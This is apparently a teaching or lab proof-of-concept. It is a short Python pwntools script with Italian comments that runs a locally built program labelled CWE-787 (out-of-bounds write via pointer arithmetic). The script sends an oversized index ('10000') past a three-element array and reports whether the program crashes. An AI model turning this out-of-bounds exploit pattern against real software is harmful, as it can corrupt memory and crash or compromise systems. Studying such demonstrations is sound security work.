/**
 * @file Exploit_Pointer_Arithmetic_OOB.py
 * @brief PoC per CWE-787 Pointer Arithmetic OOB
 * Target: build/CWE-787 Pointer Arithmetic OOB
 */
from pwn import *

context.log_level = 'info'

def exploit():
    exe = './build/CWE-787 Pointer Arithmetic OOB'
    
    log.info(f"Avvio {exe}...")
    p = process(exe)

    # Array ha dimensione 3 (indici 0, 1, 2)
    # Offset molto grande per andare fuori bounds (es. 1000 interi dopo)
    offset = b"10000"

    log.info(f"Invio offset OOB: {offset.decode()}")
    p.sendline(offset)

    try:
        output = p.recvall(timeout=2)
        log.info(f"Output:\n{output.decode(errors='ignore')}")
        
        exit_code = p.poll()
        if exit_code != 0:
            log.success(f"Il programma Ã¨ crashato con codice {exit_code} (Segfault)")
        else:
            log.warning("Nessun crash. Abbiamo scritto su memoria mappata ma non critica, o sovrascritto stack frame.")
            
    except Exception as e:
        log.error(f"Errore: {e}")

if __name__ == "__main__":
    exploit()
